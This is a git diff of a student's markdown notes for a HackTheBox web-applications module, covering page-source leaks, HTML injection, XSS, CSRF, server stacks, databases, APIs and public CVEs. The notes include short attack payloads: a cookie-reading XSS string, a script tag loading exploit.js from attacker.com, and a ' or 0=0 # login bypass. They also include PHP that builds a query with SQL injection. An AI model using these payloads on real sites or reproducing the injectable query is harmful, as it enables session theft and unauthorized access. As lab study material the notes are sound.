@@ -1,6 +1,6 @@
 # Module 02 — Introduction to Web Applications
 
-![Status](https://img.shields.io/badge/Status-In%20Progress-yellow)
+![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
 ![Platform](https://img.shields.io/badge/Platform-HackTheBox-red)
 ![Category](https://img.shields.io/badge/Category-General-blue)
 
@@ -15,12 +15,12 @@
 - [x] HTML Injection
 - [x] Cross-Site Scripting XSS
 - [x] Cross-Site Request Forgery CSRF
-- [ ] Back End Servers
-- [ ] Web Servers
-- [ ] Databases
-- [ ] Development Frameworks and APIs
-- [ ] Common Web Vulnerabilities
-- [ ] Public Vulnerabilities
+- [x] Back End Servers
+- [x] Web Servers
+- [x] Databases
+- [x] Development Frameworks and APIs
+- [x] Common Web Vulnerabilities
+- [x] Public Vulnerabilities
 
 ---
 
@@ -257,17 +257,121 @@ Developers often leave sensitive information in page source.
 - API keys or tokens in JS files
 - Test pages never removed from production
 
+### How to View Page Source
+```
+Right click → View Page Source
+Ctrl + U
+Burp Suite — works even if right click is disabled
+```
+
+### Real Example
+```html
+<!-- TODO: remove test credentials test:test -->
+```
+Credentials in an HTML comment — visible to anyone.
+Used Ctrl + U on the login page, found it immediately.
+Logged in with test:test — credentials still valid.
+
+---
+
+## HTML Injection
+
+Unfiltered user input rendered as HTML by the browser.
+Input is not treated as text — it executes as markup.
+
+### Vulnerable Code
+```html
+<script>
+  function inputFunction() {
+    var input = prompt("Please enter your name", "");
+    if (input != null) {
+      document.getElementById("output").innerHTML = "Your name is " + input;
+    }
+  }
+</script>
+```
+
+innerHTML renders raw input as HTML — zero sanitization.
+
+### Test Payload
+```html
+<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
+```
+Injected as name input — page background changed instantly.
+Confirmed HTML is rendering not escaping user input.
+
+### Real Impact
+- Inject fake login forms to steal credentials
+- Deface web pages — serious reputational damage
+- Gateway to XSS — if HTML renders, JS likely renders too
+
+---
+
+## Cross-Site Scripting (XSS)
+
+HTML Injection that executes JavaScript in the victim's browser.
+
+### Three Types
+
+| Type | How It Triggers |
+|------|----------------|
+| Reflected | Input returned in response — search results, errors |
+| Stored | Saved to DB — executes for every visitor |
+| DOM | Written directly to DOM — no server involved |
+
+### Test Payload
+```javascript
+#"><img src=/ onerror=alert(document.cookie)>
+```
+Alert popped with session cookie. Ran entirely in browser —
+no server interaction needed.
+
+### Real Impact
+- Steal session cookies → log in as victim without password
+- Target admins → escalate to back end access
+- Redirect users to phishing pages
+- Keylog everything typed on the page
+
+---
+
+## Cross-Site Request Forgery (CSRF)
+
+Tricks authenticated user's browser into making attacker's
+request using the victim's active session.
+
+### Attack Flow
+1. Victim is logged in with valid session cookie
+2. Victim views attacker content — comment, link, page
+3. Attacker JS fires using victim's browser and session
+4. Request hits target app authenticated as the victim
+
+### Common Payload
+```html
+"><script src=//attacker.com/exploit.js></script>
+```
+exploit.js changes victim's password → attacker logs in.
+
+### Prevention
+- Anti-CSRF tokens per session or request
+- SameSite=Strict cookie attribute
+- Require password confirmation before sensitive changes
+- WAF as additional layer — not a primary defense
+
+### Sanitization vs Validation
+
+| Control | What It Does |
+|---------|-------------|
+| Sanitization | Strips special characters before storing or displaying |
+| Validation | Ensures input matches expected format |
+
+Apply both on front end AND back end. One layer is not enough.
+
 ---
 
 ## Back End Servers
 
-The hardware and OS that hosts everything needed to run the web
-application. All processing happens here — users never see it.
-
-### Back End Contains These Three Components
-- Web Server
-- Database
-- Development Framework
+Hardware and OS hosting everything the web app needs.
+All processing happens here — users never see it.
 
 ### Common Back End Stacks
 
@@ -279,116 +383,67 @@ application. All processing happens here — users never see it.
 | MAMP | macOS, Apache, MySQL, PHP |
 | XAMPP | Cross-Platform, Apache, MySQL, PHP/PERL |
 
-### Other Software on Back End
-Hypervisors, containers like Docker, WAFs
-
-### Hardware
-Power and performance of the hardware determines how stable
-and responsive the web app is. Large applications distribute
-load across many back end servers working together.
-Web apps can also run on cloud hosting or data centers using
-virtual hosts instead of physical servers.
-
 ### Pentesting Relevance
-- Identifying the stack tells you what vulnerabilities to test
-- LAMP stack → test for PHP vulns, MySQL injection
-- IIS + .NET → test for ASP.NET specific vulnerabilities
-- WAF presence → need to test for bypass techniques
-- Containers and virtual hosts → lateral movement possibilities
-  if one container is compromised
-
+- Stack identification → know exactly what vulns to test
+- LAMP → PHP vulns, MySQL injection, .htaccess misconfig
+- WINS → ASP.NET vulns, Active Directory attack paths
+- WAF present → research bypass techniques before testing
+- Docker containers → compromise one, pivot to others
 
 ---
 
 ## Web Servers
 
-Application running on the back end that handles all HTTP traffic.
-Routes client requests to the right pages and returns responses.
-Runs on port **80** (HTTP) or **443** (HTTPS).
+Handles all HTTP traffic. Routes requests, returns responses.
+Runs on port 80 (HTTP) or 443 (HTTPS).
 
-### HTTP Response Codes — Pentester's Reference
+### HTTP Response Codes
 
 | Code | Meaning | Pentesting Use |
 |------|---------|---------------|
-| 200 | OK — request succeeded | Page exists, keep enumerating |
-| 301 | Moved Permanently | Note new URL, update target |
-| 302 | Found — temporary redirect | Common after login, check where it goes |
-| 400 | Bad Request | Malformed request — useful for fuzzing |
-| 401 | Unauthorized | Auth required — try default creds |
-| 403 | Forbidden | Page exists but blocked — try bypass techniques |
+| 200 | OK | Page exists — keep enumerating |
+| 301 | Moved Permanently | Note new URL |
+| 302 | Temporary Redirect | Check where it goes after login |
+| 400 | Bad Request | Useful for fuzzing |
+| 401 | Unauthorized | Try default credentials |
+| 403 | Forbidden | Page EXISTS — attempt bypass |
 | 404 | Not Found | Page does not exist |
-| 405 | Method Not Allowed | Try different HTTP methods |
-| 500 | Internal Server Error | Something broke — possible injection point |
-| 502 | Bad Gateway | Upstream server error — note the stack |
+| 405 | Method Not Allowed | Try other HTTP methods |
+| 500 | Internal Server Error | Possible injection point |
+| 502 | Bad Gateway | Note the stack behind it |
 
-> 403 does not mean unreachable — it means the page EXISTS.
-> Always attempt bypass: path traversal, header manipulation,
-> verb tampering. A 403 is more useful than a 404.
+403 means the page EXISTS — not that it is unreachable.
+Always try bypass before moving on.
 
-### Checking Server Response With cURL
-
+### Fingerprint the Server
 ```bash
-# View response headers only — reveals server type and version
 curl -I https://target.com
-
-# Full response — source code of the page
-curl https://target.com
 ```
-
-Header fingerprinting reveals the web server type and sometimes
-version — critical for finding known CVEs.
+Server version in headers → search for public CVEs immediately.
 
 ### Web Server Comparison
 
-| Server | Market Share | Best For | Used By |
-|--------|-------------|----------|---------|
-| Apache | ~40% | PHP apps, shared hosting | Apple, Adobe, Baidu |
-| NGINX | ~30% | High traffic, concurrent requests | Google, Netflix, HackTheBox |
-| IIS | ~15% | .NET apps, Active Directory environments | Microsoft, Dell, Stack Overflow |
-
-### Apache
-- Most common web server on the internet
-- Default on most Linux distributions
-- Supports PHP, .NET, Python, Perl, Bash via CGI
-- Open source — vulnerabilities are publicly disclosed
-- Common in startups and smaller companies
-
-### NGINX
-- Async architecture — handles massive concurrent requests
-- Low memory and CPU usage compared to Apache
-- Most popular among top 100,000 high traffic websites
-- Open source — same security transparency as Apache
-
-### IIS
-- Microsoft only — runs on Windows Server
-- Deeply integrated with Active Directory
-- Windows Auth = users auto sign in with AD credentials
-- If target uses IIS — assume AD is in the environment
-- Attack path: IIS vuln → Windows Server → Active Directory
-
-### Other Web Servers
-- **Apache Tomcat** — Java web applications
-- **Node.JS** — JavaScript back end applications
+| Server | Share | Notes |
+|--------|-------|-------|
+| Apache | ~40% | PHP apps, open source, most common |
+| NGINX | ~30% | High traffic, async, top 100k sites |
+| IIS | ~15% | Windows, .NET, Active Directory auth |
 
 ### Pentesting Relevance
-- Identify web server from response headers before anything else
-- Apache → look for PHP vulns, .htaccess misconfigurations
-- NGINX → look for misconfigurations in proxy settings
-- IIS → always test for Active Directory attack paths
-- 500 errors during fuzzing = you hit something — investigate
-- Version in headers → search for public CVEs immediately
+- Apache → PHP vulns, .htaccess misconfigurations
+- NGINX → misconfigured proxy settings
+- IIS → assume Active Directory is present, test AD paths
+- 500 during fuzzing = you hit something — investigate
+- Version in headers = direct path to known CVEs
 
 ---
 
 ## Databases
 
 Web apps use databases to store assets, content, and user data.
-Choosing the right database depends on speed, size, scalability,
-and cost.
 
 ### Relational (SQL)
-Stores data in tables, rows, and columns with defined relationships.
-Tables link to each other via keys — called a Schema.
+Tables, rows, columns, defined relationships via Schema.
 Fast and reliable for large structured datasets.
 
 | Database | Notes |
@@ -399,52 +454,33 @@ Fast and reliable for large structured datasets.
 | PostgreSQL | Open source, highly extensible |
 
 ### Non-Relational (NoSQL)
-No tables, rows, or schemas. Flexible and scalable.
-Best for unstructured or rapidly changing data.
-
-| Model | How It Stores Data |
-|-------|--------------------|
-| Key-Value | JSON/XML pairs — key maps to a value |
-| Document-Based | Complex JSON objects with metadata |
-| Wide-Column | Column-focused, good for analytics |
-| Graph | Nodes and edges — relationships between data |
+No tables or schemas. Flexible and scalable.
 
 | Database | Notes |
 |----------|-------|
 | MongoDB | Most common NoSQL, document-based, free |
-| ElasticSearch | Optimized for fast search on huge datasets |
+| ElasticSearch | Fast search on huge datasets |
 | Apache Cassandra | Scalable, handles faults gracefully |
 
-### How Web Apps Use Databases
-
+### Vulnerable Database Code
 ```php
-// Connect to database
-$conn = new mysqli("localhost", "user", "pass", "database1");
-
-// Query using user input — VULNERABLE to SQLi
 $searchInput = $_POST['findUser'];
 $query = "select * from users where name like '%$searchInput%'";
-$result = $conn->query($query);
 ```
-
-User input goes directly into the query — no sanitization.
-This is exactly how SQL Injection happens.
+User input directly in query — no sanitization — classic SQLi.
 
 ### Pentesting Relevance
-- MySQL + PHP = test every input field for SQLi
-- MSSQL + IIS = xp_cmdshell may be enabled → OS command execution
-- MongoDB = test for NoSQL injection — different syntax, same concept
-- ElasticSearch = often exposed without auth on internal networks
-- Any raw user input in a query = potential injection point
-
+- MySQL + PHP = test every input for SQLi
+- MSSQL = xp_cmdshell may be enabled → OS command execution
+- MongoDB = test for NoSQL injection
+- ElasticSearch = often exposed without auth internally
+- Any raw user input in a query = injection point
 
 ---
 
 ## Development Frameworks and APIs
 
 ### Web Frameworks
-Pre-built libraries handling common functionality — auth,
-routing, database connections — so developers build faster.
 
 | Framework | Language | Used By |
 |-----------|----------|---------|
@@ -453,23 +489,14 @@ routing, database connections — so developers build faster.
 | Django | Python | Google, YouTube, Instagram |
 | Rails | Ruby | GitHub, Twitch, Airbnb |
 
-Framework identification reveals known CVEs, default
-misconfigurations, and predictable directory structures.
+Framework identification → known CVEs and predictable structure.
 
 ### Query Parameters
-Two ways user input reaches the back end:
-
-```http
+```
 GET  → /search.php?item=apples
 POST → /search.php  body: item=apples
 ```
-
 Every parameter is a potential injection point.
-Test GET, POST, and all hidden fields.
-
-### APIs
-Interface allowing front end to request actions from back end.
-Accessed over HTTP, returns structured data.
 
 ### SOAP vs REST
 
@@ -477,7 +504,7 @@ Accessed over HTTP, returns structured data.
 |-|------|------|
 | Format | XML | JSON |
 | Structure | Strict, verbose | Flexible, lightweight |
-| Use Case | Complex data, stateful objects | Search, filter, CRUD |
+| Use Case | Complex data, stateful | Search, filter, CRUD |
 
 ### REST HTTP Methods
 
@@ -489,13 +516,11 @@ Accessed over HTTP, returns structured data.
 | DELETE | Remove data |
 
 ### Pentesting Relevance
-- Framework version in headers or error pages → search CVEs
-- REST endpoints hidden in JS files → untested API surface
-- Test all four HTTP methods on every endpoint — PUT and
-  DELETE are often left unrestricted by developers
-- SOAP errors are verbose — leak internal structure and stack
-- API endpoints bypass UI validation — always test directly
-  with Burp or curl, never rely on client side restrictions
+- Framework version in headers → search CVEs
+- REST endpoints in JS files → hidden untested API surface
+- Test all four HTTP methods — PUT and DELETE often unrestricted
+- SOAP errors leak internal structure and stack details
+- API endpoints bypass UI validation — test directly with Burp
 
 ---
 
@@ -509,8 +534,7 @@ Accessed over HTTP, returns structured data.
 | Broken Access Control | Access pages or features without permission |
 
 Real example — College Management System 1.2:
-
-Email field: `' or 0=0 #` and any password
+Email field: `' or 0=0 #` with any password
 SQLi in login form → authenticated without an account.
 
 ### Malicious File Upload
@@ -532,9 +556,11 @@ Injected command ran alongside original — full OS access.
 ### SQL Injection
 User input goes directly into SQL query without sanitization.
 
+```php
 $query = "select * from users where name like '%$searchInput%'";
+```
 
-College Management System 1.2 — same app, also SQLi on login.
+College Management System 1.2 — SQLi on login.
 Query always returns true → authenticated, data extracted.
 
 ### Pentesting Relevance
@@ -543,9 +569,12 @@ Query always returns true → authenticated, data extracted.
 - Every field triggering a system action — test command injection
 - Every search and filter field — test for SQLi
 - Misconfigs cause these vulns even in fully patched public apps
+
+---
+
 ## Public Vulnerabilities
 
-### Where to Search for Public Exploits
+### Where to Search
 
 | Resource | URL |
 |----------|-----|
@@ -555,18 +584,16 @@ Query always returns true → authenticated, data extracted.
 | NVD | nvd.nist.gov |
 
 ### Attack Workflow
-1. Identify web app and version — check page source, version.php,
-   error pages, response headers
+1. Identify app and version — source, version.php, headers, errors
 2. Search Google: `[app name] [version] exploit`
 3. Check exploit databases for public CVEs
-4. Prioritize CVEs with score 8-10 or leading to RCE
-5. Also check plugins and external components separately —
-   they have their own CVEs
+4. Prioritize CVSS 8-10 or RCE leading exploits
+5. Check plugins and components separately — own CVEs
 
 ### CVSS Scoring
 
-| Version | Severity | Score Range |
-|---------|----------|-------------|
+| Version | Severity | Score |
+|---------|----------|-------|
 | V2 | Low | 0.0 – 3.9 |
 | V2 | Medium | 4.0 – 6.9 |
 | V2 | High | 7.0 – 10.0 |
@@ -576,20 +603,36 @@ Query always returns true → authenticated, data extracted.
 | V3 | High | 7.0 – 8.9 |
 | V3 | Critical | 9.0 – 10.0 |
 
-CVSS V3 added Critical as a separate tier — V2 capped at High.
+V3 added Critical as separate tier — V2 capped at High.
 Always note which version a score is reported in.
 
 ### Back End Component Vulnerabilities
-- Web server vulns = highest priority, directly exposed externally
-- Example: ShellShock — Apache pre-2014, RCE via HTTP headers
-- DB and OS vulns = usually exploited after initial access
-- Used to escalate privileges or pivot to other internal servers
-- Still need patching even if not directly externally exploitable
+- Web server vulns = highest priority — directly exposed externally
+- ShellShock — Apache pre-2014, RCE via HTTP headers
+- DB and OS vulns = exploited after initial access
+- Used to escalate privileges or pivot to internal servers
 
 ### Pentesting Relevance
 - Version identification is step one on every engagement
-- A known CVE on an unpatched app = direct path to RCE
-- Always check third party plugins — they are often the weak link
-- CVSS score guides your report severity rating — use V3
-- Base score only — adjust with Temporal and Environmental
-  metrics when writing client reports for accurate risk rating
+- Known CVE on unpatched app = direct path to RCE
+- Always check third party plugins — often the weak link
+- Use V3 CVSS for report severity ratings
+- Adjust with Temporal and Environmental for client reports
+
+---
+
+## Key Takeaways
+- Web apps are dynamic, platform-independent, always changing
+- Three tier architecture — Presentation, Application, Data
+- Front end is whitebox — back end is blackbox by default
+- HTML structures, CSS styles, JavaScript controls behavior
+- DOM is the primary attack surface for XSS
+- URL encoding used in payloads to bypass filters
+- Page source is always the first thing to check on a target
+- HTML Injection proves the door is open for JavaScript injection
+- XSS steals sessions — CSRF weaponizes those sessions
+- Sanitize and validate on both front end and back end
+- Stack identification shapes your entire attack strategy
+- 403 means the resource exists — never stop there
+- Version in headers = direct path to known CVEs
+- OWASP Top 10 is the foundation of everything in this path
